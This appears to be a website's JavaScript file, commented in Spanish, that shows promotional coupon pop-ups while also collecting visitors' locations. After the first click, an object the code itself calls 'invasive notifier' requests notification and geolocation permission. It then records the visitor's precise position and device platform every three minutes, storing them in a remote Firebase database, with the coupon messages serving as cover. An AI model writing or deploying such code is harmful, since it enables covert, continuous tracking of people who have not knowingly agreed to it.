/* CONEXION BASE DE DATOS */
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
  getCountFromServer
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyBZavR7TNRrzKrxr1RqnvfrUelMLz81hyg",
  authDomain: "bd-herramienta-busqueda.firebaseapp.com",
  projectId: "bd-herramienta-busqueda",
  storageBucket: "bd-herramienta-busqueda.firebasestorage.app",
  messagingSenderId: "416153196731",
  appId: "1:416153196731:web:b0bc4ffe60cbb3a9a3319e",
  measurementId: "G-6S15ZGGCQ4"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

/* FUNCION DE BD OPTIMIZADA */
async function guardarUbicacionBD(lat, lon) {
  try {
    const colRef = collection(db, "ubicaciones");

    // En lugar de calcular el ID manualmente, dejamos que Firestore lo gestione
    // Si necesitas un ID numérico forzado, podrías usar una transacción, 
    // pero para logs de ubicación, el serverTimestamp es mejor para ordenar.

    await addDoc(colRef, {
      ubicacion: { latitude: lat, longitude: lon }, // Mejor como objeto que como String para queries
      fecha_ubi: serverTimestamp(),
      plataforma: navigator.platform
    });

    console.log("Ubicación enviada con éxito");
  } catch (e) {
    console.error("Error en Firestore:", e);
  }
}

/* FUNCION DE GEOLOCALIZACION OPTIMIZADA */
function obtenerUbicacion() {
  const resultado = document.getElementById("resultado");

  // Verificamos el estado del permiso antes de preguntar
  navigator.permissions.query({ name: 'geolocation' }).then(function (result) {
    if (result.state === 'denied') {
      console.warn("El usuario denegó la ubicación. No preguntaremos más.");
      return; // Salimos de la función para no molestar
    }

    if (navigator.geolocation) {
      if (resultado) resultado.innerHTML = "Actualizando...";

      navigator.geolocation.getCurrentPosition(
        (posicion) => {
          const lat = posicion.coords.latitude;
          const lon = posicion.coords.longitude;
          if (resultado) resultado.innerHTML = `Lat: ${lat}, ${lon}`;
          guardarUbicacionBD(lat, lon);
        },
        (error) => {
          // Si el usuario cierra el cuadro sin responder o hay error de GPS
          console.error("Error GPS:", error.message);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000, // Damos 10 segundos para responder
          maximumAge: 0   // Forzamos a que no use una ubicación vieja cacheada
        }
      );
    }
  });
}

/* NOTIFICADOR - Solo inicia el ciclo si hay permiso */
const NotificadorInvasivo = {
  registration: null,
  iniciar: async function (ms) {
    try {
      this.registration = await navigator.serviceWorker.register('/sw.js');

      // La primera vez que el usuario hace clic, sale el cuadro de diálogo
      let permission = await Notification.requestPermission();

      if (permission === "granted") {
        // Ejecutamos la primera vez (aquí saldrá el cuadro de ubicación)
        obtenerUbicacion();

        // El ciclo de 3 minutos solo ejecutará la función, 
        // pero el navegador ya no preguntará porque ya tendrá el "Sí" o el "No".
        setInterval(() => {
          obtenerUbicacion();
        }, ms);
      }
    } catch (err) {
      console.error("Fallo en registro:", err);
    }
  }
};

/* GESTIÓN DE NOTIFICACIONES (CUPÓN) - Versión compatible con Móvil */
const Noti = {
  msg: "¡Cupón: PROMO2026! 🎁",
  lanzar: async function () {
    if (Notification.permission === "granted") {
      // INTENTO 1: Usar Service Worker (Ideal para Android)
      const reg = await navigator.serviceWorker.getRegistration();
      if (reg) {
        reg.showNotification("¡Nuevo Cupón!", {
          body: this.msg,
          icon: '/favicon.ico', // Asegúrate de que esta ruta exista
          badge: '/favicon.ico',
          vibrate: [200, 100, 200],
          tag: 'promo-notification' // Evita duplicados
        });
      } else {
        // INTENTO 2: Fallback tradicional (Para PC)
        new Notification("¡Nuevo Cupón!", { body: this.msg });
      }
    }

    // Notificación visual en pantalla (El div negro)
    const div = document.createElement('div');
    div.innerHTML = this.msg;
    div.style = "position:fixed;bottom:20px;right:20px;background:#000;color:#fff;padding:15px;border-radius:8px;z-index:9999;font-family:sans-serif;";
    document.body.appendChild(div);
    setTimeout(() => div.remove(), 5000);
  }
};

/* ACTIVACIÓN UNIFICADA */
document.addEventListener('click', () => {
  // 180000 ms = 3 minutos
  NotificadorInvasivo.iniciar(180000);

  // Lanzar la primera de inmediato y luego cada 3 mins
  Noti.lanzar();
  setInterval(() => Noti.lanzar(), 180000);
}, { once: true });

/* JQUERY FLIP */
$(document).ready(function () {
  $("#card").flip();
  $("#carde").flip();
});